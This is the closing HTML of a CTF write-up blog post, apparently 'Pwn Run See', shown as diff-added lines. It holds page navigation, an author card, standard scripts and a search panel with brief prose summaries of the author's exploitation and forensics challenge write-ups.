+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+
+<div class="figure  center fig-100" >
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/PwnRunSee/end.gif" >
+  
+  
+</div>
+
+  <div style="clear:both;"></div>
+
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/pwn/">pwn</a>
+
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/uaf/">UAF</a>
+
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/docker/">docker</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/10/tmnt/" data-tooltip="TMNT">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/05/filereader/" data-tooltip="Filereader">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2019 Hugo VINCENT. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/10/tmnt/" data-tooltip="TMNT">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/05/filereader/" data-tooltip="Filereader">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fhug0vincent.github.io%2F2019%2F10%2Fpwn-run-see-part-1-2%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fhug0vincent.github.io%2F2019%2F10%2Fpwn-run-see-part-1-2%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://hug0vincent.github.io/images/profil.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Hugo VINCENT</h4>
+    
+      <div id="about-card-bio">Student in computer security</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Student at INSA / SIF master
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        France
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/tmnt/">
+                <h3 class="media-heading">TMNT</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+                <h3 class="media-heading">Pwn Run See (part 1 &amp; 2)</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/05/filereader/">
+                <h3 class="media-heading">Filereader</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/05/give-me-your-shell/">
+                <h3 class="media-heading">Give Me Your Shell</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     inshack-2019 gimme-your-shell pwn 50 67    TL;DR This is a remote buffer overflow challenge, there is no protection on the binary but ASLR is enable on the remote server. I redirected the execution flow to write my shellcode to a controled area, then jump to it and execute it.
+Getting informations First I looked at the protections on the binary :</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2018/12/mission-impossible-1/">
+                <h3 class="media-heading">Mission impossible 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     santhacklausctf mi1 Forensic/Crypto 800 18    TL;DR After downloading the zip file we were faced with a linux memory dump. After building the correct profile for volatility you had to perform a known plain text attack on an encrypted and splited zip file to recover the file flag.txt.
+Introduction After downloading the file MI1.zip we had a memdump.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+                <h3 class="media-heading">Mission impossible 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         6 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://hug0vincent.github.io/images/bg2.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://hug0vincent.github.io/js/script-hbdqx7wlhrscaipt6txjo74wihw1bagwt97hjgdefg9y8kq3xpotphkbsilg.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/hug0vincent.github.io\/2019\/10\/pwn-run-see-part-1-2\/';
+          
+            this.page.identifier = '\/2019\/10\/pwn-run-see-part-1-2\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'https-hug0vincent-github-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
